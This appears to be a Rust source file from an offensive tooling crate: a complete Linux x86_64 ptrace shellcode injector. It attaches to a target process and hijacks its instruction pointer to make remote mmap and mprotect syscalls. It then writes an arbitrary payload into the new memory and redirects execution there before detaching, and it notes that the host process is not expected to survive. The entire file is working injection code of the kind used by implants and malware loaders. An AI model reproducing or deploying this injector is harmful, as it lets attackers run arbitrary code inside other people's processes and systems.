use crate::injection::Injector;
use anyhow::{anyhow, Result};

pub struct LinuxPtraceInjector;

#[cfg(target_os = "linux")]
impl Injector for LinuxPtraceInjector {
    /// Fire-and-forget Linux ptrace injection.
    ///
    /// This injector redirects the target thread RIP to injected shellcode and
    /// then detaches without restoring the original RIP or execution context.
    /// The target process should therefore be treated as non-surviving once
    /// shellcode returns unless the payload explicitly transfers control to a
    /// stable endpoint.
    ///
    /// Payloads must either call `execve()`, call `exit()`, or be
    /// position-independent and implement an explicit return-to-host mechanism.
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        if payload.is_empty() {
            return Err(anyhow!("LinuxPtraceInjector: payload is empty"));
        }

        let target_pid = pid as libc::pid_t;
        if target_pid <= 0 {
            return Err(anyhow!("LinuxPtraceInjector: invalid pid {pid}"));
        }

        let _attach = AttachGuard::attach(target_pid)?;

        #[cfg(not(target_arch = "x86_64"))]
        {
            return Err(anyhow!(
                "LinuxPtraceInjector currently supports x86_64 only"
            ));
        }

        #[cfg(target_arch = "x86_64")]
        {
            let original_regs = ptrace_getregs(target_pid)?;
            let remote_addr = remote_mmap_rw(target_pid, payload.len(), &original_regs)?;

            write_payload(target_pid, remote_addr, payload)?;
            remote_mprotect_rx(target_pid, remote_addr, payload.len(), &original_regs)?;

            let mut exec_regs = original_regs;
            exec_regs.rip = remote_addr as u64;
            ptrace_setregs(target_pid, &exec_regs)?;

            log::info!(
                "LinuxPtraceInjector: staged {} bytes at 0x{:x} in pid {}",
                payload.len(),
                remote_addr,
                pid
            );
            Ok(())
        }
    }
}

#[cfg(target_os = "linux")]
struct AttachGuard {
    pid: libc::pid_t,
    attached: bool,
}

#[cfg(target_os = "linux")]
impl AttachGuard {
    fn attach(pid: libc::pid_t) -> Result<Self> {
        // SAFETY: ptrace is called with PTRACE_ATTACH on a caller-supplied
        // pid. Return values are checked and no pointers are dereferenced.
        let rc = unsafe {
            libc::ptrace(
                libc::PTRACE_ATTACH,
                pid,
                std::ptr::null_mut::<libc::c_void>(),
                std::ptr::null_mut::<libc::c_void>(),
            )
        };
        if rc == -1 {
            return Err(anyhow!(
                "LinuxPtraceInjector: PTRACE_ATTACH({pid}) failed: {}",
                std::io::Error::last_os_error()
            ));
        }

        wait_for_stopped(pid, "PTRACE_ATTACH")?;
        Ok(Self {
            pid,
            attached: true,
        })
    }
}

#[cfg(target_os = "linux")]
impl Drop for AttachGuard {
    fn drop(&mut self) {
        if !self.attached {
            return;
        }
        // SAFETY: best-effort detach in Drop; no pointers are dereferenced.
        unsafe {
            libc::ptrace(
                libc::PTRACE_DETACH,
                self.pid,
                std::ptr::null_mut::<libc::c_void>(),
                std::ptr::null_mut::<libc::c_void>(),
            );
        }
        self.attached = false;
    }
}

#[cfg(target_os = "linux")]
fn wait_for_stopped(pid: libc::pid_t, context: &str) -> Result<()> {
    let mut status: libc::c_int = 0;
    // SAFETY: waitpid writes to `status`, which is valid for the call.
    let waited = unsafe { libc::waitpid(pid, &mut status as *mut libc::c_int, 0) };
    if waited == -1 {
        return Err(anyhow!(
            "LinuxPtraceInjector: waitpid after {} failed: {}",
            context,
            std::io::Error::last_os_error()
        ));
    }
    if !libc::WIFSTOPPED(status) {
        return Err(anyhow!(
            "LinuxPtraceInjector: target pid {} not stopped after {} (status=0x{:x})",
            pid,
            context,
            status
        ));
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn ptrace_continue_and_wait(pid: libc::pid_t) -> Result<()> {
    // SAFETY: ptrace continue with checked return value; no pointers dereferenced.
    let rc = unsafe {
        libc::ptrace(
            libc::PTRACE_CONT,
            pid,
            std::ptr::null_mut::<libc::c_void>(),
            std::ptr::null_mut::<libc::c_void>(),
        )
    };
    if rc == -1 {
        return Err(anyhow!(
            "LinuxPtraceInjector: PTRACE_CONT failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    wait_for_stopped(pid, "PTRACE_CONT")
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn ptrace_getregs(pid: libc::pid_t) -> Result<libc::user_regs_struct> {
    // SAFETY: zeroed is valid for this plain-old-data struct.
    let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: ptrace writes into `regs` via a valid mutable pointer.
    let rc = unsafe {
        libc::ptrace(
            libc::PTRACE_GETREGS,
            pid,
            std::ptr::null_mut::<libc::c_void>(),
            &mut regs as *mut libc::user_regs_struct as *mut libc::c_void,
        )
    };
    if rc == -1 {
        return Err(anyhow!(
            "LinuxPtraceInjector: PTRACE_GETREGS failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    Ok(regs)
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn ptrace_setregs(pid: libc::pid_t, regs: &libc::user_regs_struct) -> Result<()> {
    // SAFETY: ptrace reads from the valid immutable `regs` pointer.
    let rc = unsafe {
        libc::ptrace(
            libc::PTRACE_SETREGS,
            pid,
            std::ptr::null_mut::<libc::c_void>(),
            regs as *const libc::user_regs_struct as *mut libc::c_void,
        )
    };
    if rc == -1 {
        return Err(anyhow!(
            "LinuxPtraceInjector: PTRACE_SETREGS failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn last_errno() -> i32 {
    // SAFETY: __errno_location returns a thread-local errno pointer.
    unsafe { *libc::__errno_location() }
}

#[cfg(target_os = "linux")]
fn clear_errno() {
    // SAFETY: __errno_location returns a thread-local errno pointer.
    unsafe {
        *libc::__errno_location() = 0;
    }
}

#[cfg(target_os = "linux")]
fn ptrace_peek_data(pid: libc::pid_t, addr: usize) -> Result<libc::c_long> {
    clear_errno();
    // SAFETY: ptrace reads one machine word from traced process address space.
    let word = unsafe {
        libc::ptrace(
            libc::PTRACE_PEEKDATA,
            pid,
            addr as *mut libc::c_void,
            std::ptr::null_mut::<libc::c_void>(),
        )
    };
    if word == -1 && last_errno() != 0 {
        return Err(anyhow!(
            "LinuxPtraceInjector: PTRACE_PEEKDATA(0x{:x}) failed: {}",
            addr,
            std::io::Error::last_os_error()
        ));
    }
    Ok(word)
}

#[cfg(target_os = "linux")]
fn ptrace_poke_data(pid: libc::pid_t, addr: usize, data: libc::c_long) -> Result<()> {
    // SAFETY: ptrace writes one machine word value into traced process memory.
    let rc = unsafe {
        libc::ptrace(
            libc::PTRACE_POKEDATA,
            pid,
            addr as *mut libc::c_void,
            data as usize as *mut libc::c_void,
        )
    };
    if rc == -1 {
        return Err(anyhow!(
            "LinuxPtraceInjector: PTRACE_POKEDATA(0x{:x}) failed: {}",
            addr,
            std::io::Error::last_os_error()
        ));
    }
    Ok(())
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
struct RipPatchGuard {
    pid: libc::pid_t,
    rip: usize,
    original_word: libc::c_long,
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
impl RipPatchGuard {
    fn install(pid: libc::pid_t, rip: usize) -> Result<Self> {
        let original_word = ptrace_peek_data(pid, rip)?;
        let patched_word = ((original_word as u64) & !0x00ff_ffff_u64) | 0x00cc_050f_u64;
        ptrace_poke_data(pid, rip, patched_word as libc::c_long)?;
        Ok(Self {
            pid,
            rip,
            original_word,
        })
    }
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
impl Drop for RipPatchGuard {
    fn drop(&mut self) {
        let _ = ptrace_poke_data(self.pid, self.rip, self.original_word);
    }
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn remote_mmap_rw(
    pid: libc::pid_t,
    requested_len: usize,
    original_regs: &libc::user_regs_struct,
) -> Result<usize> {
    let page_size = {
        // SAFETY: sysconf is called with a valid constant.
        let ps = unsafe { libc::sysconf(libc::_SC_PAGESIZE) };
        if ps > 0 {
            ps as usize
        } else {
            4096
        }
    };
    let min_len = requested_len.max(1);
    let alloc_len = ((min_len + page_size - 1) / page_size) * page_size;

    let rip = original_regs.rip as usize;
    let _patch = RipPatchGuard::install(pid, rip)?;

    let mut mmap_regs = *original_regs;
    mmap_regs.rax = libc::SYS_mmap as u64;
    mmap_regs.rdi = 0;
    mmap_regs.rsi = alloc_len as u64;
    mmap_regs.rdx = (libc::PROT_READ | libc::PROT_WRITE) as u64;
    mmap_regs.r10 = (libc::MAP_PRIVATE | libc::MAP_ANONYMOUS) as u64;
    mmap_regs.r8 = u64::MAX;
    mmap_regs.r9 = 0;

    ptrace_setregs(pid, &mmap_regs)?;
    ptrace_continue_and_wait(pid)?;

    let post_regs = ptrace_getregs(pid)?;
    ptrace_setregs(pid, original_regs)?;

    let mmap_result = post_regs.rax as i64;
    if mmap_result < 0 {
        return Err(anyhow!(
            "LinuxPtraceInjector: remote mmap syscall failed with {}",
            mmap_result
        ));
    }

    Ok(post_regs.rax as usize)
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn remote_mprotect_rx(
    pid: libc::pid_t,
    remote_addr: usize,
    requested_len: usize,
    original_regs: &libc::user_regs_struct,
) -> Result<()> {
    let page_size = {
        // SAFETY: sysconf is called with a valid constant.
        let ps = unsafe { libc::sysconf(libc::_SC_PAGESIZE) };
        if ps > 0 {
            ps as usize
        } else {
            4096
        }
    };
    let min_len = requested_len.max(1);
    let aligned_start = remote_addr & !(page_size - 1);
    let end_addr = remote_addr
        .checked_add(min_len)
        .ok_or_else(|| anyhow!("LinuxPtraceInjector: mprotect range overflow"))?;
    let aligned_end = ((end_addr + page_size - 1) / page_size) * page_size;
    let prot_len = aligned_end
        .checked_sub(aligned_start)
        .ok_or_else(|| anyhow!("LinuxPtraceInjector: invalid mprotect range"))?;

    let rip = original_regs.rip as usize;
    let _patch = RipPatchGuard::install(pid, rip)?;

    let mut mprotect_regs = *original_regs;
    mprotect_regs.rax = libc::SYS_mprotect as u64;
    mprotect_regs.rdi = aligned_start as u64;
    mprotect_regs.rsi = prot_len as u64;
    mprotect_regs.rdx = (libc::PROT_READ | libc::PROT_EXEC) as u64;

    ptrace_setregs(pid, &mprotect_regs)?;
    ptrace_continue_and_wait(pid)?;

    let post_regs = ptrace_getregs(pid)?;
    ptrace_setregs(pid, original_regs)?;

    let mprotect_result = post_regs.rax as i64;
    if mprotect_result < 0 {
        return Err(anyhow!(
            "LinuxPtraceInjector: remote mprotect syscall failed with {}",
            mprotect_result
        ));
    }

    Ok(())
}

#[cfg(target_os = "linux")]
fn write_payload(pid: libc::pid_t, remote_addr: usize, payload: &[u8]) -> Result<()> {
    if try_process_vm_writev(pid, remote_addr, payload)? {
        return Ok(());
    }
    write_with_ptrace_pokedata(pid, remote_addr, payload)
}

#[cfg(target_os = "linux")]
fn try_process_vm_writev(pid: libc::pid_t, remote_addr: usize, payload: &[u8]) -> Result<bool> {
    let local_iov = libc::iovec {
        iov_base: payload.as_ptr() as *mut libc::c_void,
        iov_len: payload.len(),
    };
    let remote_iov = libc::iovec {
        iov_base: remote_addr as *mut libc::c_void,
        iov_len: payload.len(),
    };

    // SAFETY: iovec pointers are valid for the specified lengths.
    let written = unsafe {
        libc::process_vm_writev(
            pid,
            &local_iov as *const libc::iovec,
            1,
            &remote_iov as *const libc::iovec,
            1,
            0,
        )
    };

    if written as usize == payload.len() {
        return Ok(true);
    }

    if written == -1 {
        let err = std::io::Error::last_os_error();
        if err.raw_os_error() == Some(libc::ENOSYS) {
            log::warn!(
                "LinuxPtraceInjector: process_vm_writev unavailable (ENOSYS); using PTRACE_POKEDATA fallback"
            );
            return Ok(false);
        }

        return Err(anyhow!(
            "LinuxPtraceInjector: process_vm_writev failed: {}",
            err
        ));
    }

    log::warn!(
        "LinuxPtraceInjector: process_vm_writev wrote {} of {} bytes; completing with PTRACE_POKEDATA",
        written,
        payload.len()
    );
    Ok(false)
}

#[cfg(target_os = "linux")]
fn write_with_ptrace_pokedata(pid: libc::pid_t, remote_addr: usize, payload: &[u8]) -> Result<()> {
    let word_size = std::mem::size_of::<libc::c_long>();
    let mut offset = 0usize;

    while offset < payload.len() {
        let remaining = payload.len() - offset;
        let chunk_len = remaining.min(word_size);
        let dst = remote_addr + offset;

        let mut word_u64: u64 = if chunk_len == word_size {
            0
        } else {
            ptrace_peek_data(pid, dst)? as u64
        };

        for i in 0..chunk_len {
            let shift = (i * 8) as u32;
            let mask = !(0xff_u64 << shift);
            word_u64 = (word_u64 & mask) | ((payload[offset + i] as u64) << shift);
        }

        ptrace_poke_data(pid, dst, word_u64 as libc::c_long)?;
        offset += chunk_len;
    }

    Ok(())
}